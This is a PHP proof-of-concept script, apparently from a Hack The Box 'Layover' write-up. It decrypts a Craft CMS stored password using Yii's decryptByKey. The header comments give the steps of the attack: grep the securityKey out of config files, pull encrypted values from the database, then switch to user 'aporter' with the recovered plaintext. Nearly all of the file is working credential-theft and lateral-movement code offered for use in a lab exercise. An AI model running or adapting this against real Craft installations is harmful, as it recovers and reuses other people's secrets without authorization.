<?php
/**
 * HTB Layover — Yii decryptByKey on a Craft CMS encrypted value
 * Source: layover.txt   |   Arsenal ref: §8.3
 *
 * Craft stores secrets (here: the mail-relay password) encrypted with the app's
 * securityKey using Yii's base\\Security::decryptByKey. With the vendor tree readable
 * on the box you can decrypt them offline and reuse the plaintext for aporter.
 *
 * Why decryptByKey and not simply base64_decode: Craft prepends a 32-byte salt +
 * HMAC to the ciphertext, and Yii strips that header before AES-CBC decryption.
 *
 * Usage (run from the Craft webroot that contains vendor/ and config/):
 *   php poc_htb_layover_decrypt.php "<BASE64_CIPHERTEXT>" "<SECURITY_KEY>"
 *
 * Get the two inputs:
 *   grep -i securityKey config/*.php            # securityKey value
 *   mysql -u <user> -p <db> -e "select * from <table> where <col> like '%:%'"
 *
 * Then:  su - aporter   (with the decrypted password)
 */

if ($argc < 3) {
    fwrite(STDERR, "usage: php {$argv[0]} <base64-ciphertext> <securityKey>\n");
    exit(2);
}

if (!file_exists(__DIR__ . '/vendor/autoload.php')) {
    fwrite(STDERR, "[-] vendor/autoload.php not found — run this from the Craft webroot\n");
    exit(1);
}

require __DIR__ . '/vendor/autoload.php';

$ciphertext = $argv[1];
$key        = $argv[2];

// Accept either raw base64 or a Yii-formatted "<salt>:<hmac>:<cipher>" triple.
if (strpos($ciphertext, ':') !== false) {
    $parts = explode(':', $ciphertext, 2);
    $ciphertext = $parts[1];
}

$raw = base64_decode($ciphertext, true);
if ($raw === false) {
    fwrite(STDERR, "[-] ciphertext is not valid base64\n");
    exit(1);
}

try {
    $security = new yii\base\Security();
    $plain    = $security->decryptByKey($raw, $key);
    echo $plain, PHP_EOL;
} catch (Throwable $e) {
    fwrite(STDERR, "[-] decrypt failed: " . $e->getMessage() . PHP_EOL);
    fwrite(STDERR, "    wrong securityKey, or this value used encryptByPassword rather than byKey\n");
    exit(1);
}
